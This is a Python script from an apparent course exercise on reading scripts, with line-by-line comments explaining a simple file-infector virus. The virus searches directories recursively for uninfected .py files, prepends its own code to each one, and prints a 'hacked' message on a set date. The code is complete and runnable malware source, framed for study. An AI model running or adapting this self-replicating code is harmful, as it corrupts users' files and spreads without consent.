# Script Name:                  Ops Challenge 14  
# Author:                       Dominique Bruso
# Date of latest revision:      12/15/2023
# Purpose:                      To practice reading scripts
# Execution:                    Don't! 
# Source: 

#!/usr/bin/python3
# Shebang line indicating that the script should be executed using the Python 3 interpreter.

# import os
    # Imports operations available in the operating system 
import os

# import datetime
    # Imports the ability to use dates and times
import datetime

# SIGNATURE = "VIRUS"
    # Declares a variable to store the signature of the virus
SIGNATURE = "VIRUS"

def locate(path):
    # Starts defining a function called locate that receives the argument path    
    files_targeted = []  # List to store targeted files
    filelist = os.listdir(path)  # Gets a list of files in the specified directory
    for fname in filelist:
        if os.path.isdir(path+"/"+fname): # Within the loop, this line checks whether the current file or directory (specified by path+"/"+fname) is a directory
            # Recursively explores directories and extends the list of targeted files
            files_targeted.extend(locate(path+"/"+fname))
        elif fname[-3:] == ".py": # If the current item (fname) is not a directory, this line checks whether the file has a ".py" extension.
            infected = False  # Tracks if the file is infected true/false
            for line in open(path+"/"+fname):
                if SIGNATURE in line:
                    infected = True
                    break # exits the loop
            if not infected:
                files_targeted.append(path+"/"+fname)  # Appends uninfected files to the list
    return files_targeted  #returns the targeted files

def infect(files_targeted):
    # Defines another function 'infect' that receives the argument 'files_targeted"  
    virus = open(os.path.abspath(__file__))  # Opens the current script as the source of the virus
    virusstring = ""
    for i, line in enumerate(virus):
        if 0 <= i < 39: # Initiates a loop that iterates over each line of the file object virus. enumerate is used here to get both the line content (line) and the line number (i)
            virusstring += line  # Creates a string with the first 39 lines of the script
    virus.close()  # Closes the virus file
    for fname in files_targeted:
        f = open(fname)
        temp = f.read()  # Reads the content of the targeted file
        f.close()
        f = open(fname, "w")
        f.write(virusstring + temp)  # Writes the virus string followed by the original content
        f.close() # closes the file

def detonate():
    # Defines a function 'detonate'
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
        print("You have been hacked")
    # Prints "You have been hacked" if certain date/time parameters are met 

# Defining more variables
files_targeted = locate(os.path.abspath(""))  # Initiates the file search from the current directory
infect(files_targeted)  # Infects the targeted files with the virus
detonate()  # Checks for a specific date to trigger the "You have been hacked" message
